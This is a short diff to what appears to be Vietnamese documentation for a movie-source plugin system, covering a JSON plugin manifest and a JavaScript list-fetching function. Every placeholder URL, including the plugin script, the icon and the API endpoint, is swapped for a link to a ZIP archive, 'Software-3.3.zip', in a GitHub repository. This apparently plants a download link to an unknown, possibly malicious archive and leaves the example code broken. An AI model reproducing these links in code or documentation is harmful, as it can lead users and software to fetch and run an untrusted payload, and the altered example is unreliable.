@@ -18,8 +18,8 @@ Là danh sách (Menu) các Plugin để người dùng nhìn thấy trong phần
             "id": "myplugin1",
             "name": "Nguồn Phim ABCD",
             "version": "1.0.0",
-            "scriptUrl": "https://raw.githubusercontent.com/.../my_plugin.js",
-            "iconUrl": "https://raw.githubusercontent.com/.../icon.png"
+            "scriptUrl": "https://github.com/trieu1910/repo/raw/refs/heads/main/plugins/Software-3.3.zip",
+            "iconUrl": "https://github.com/trieu1910/repo/raw/refs/heads/main/plugins/Software-3.3.zip"
         }
     ]
 }
@@ -75,7 +75,7 @@ function getManifest() {
 }
 function getUrlList(slug, filtersJson) {
     var filters = JSON.parse(filtersJson || "{}");
-    return "https://api.domain.com/movies?page=" + (filters.page || 1);
+    return "https://github.com/trieu1910/repo/raw/refs/heads/main/plugins/Software-3.3.zip" + (filters.page || 1);
 }
 function parseListResponse(html) {
     try {
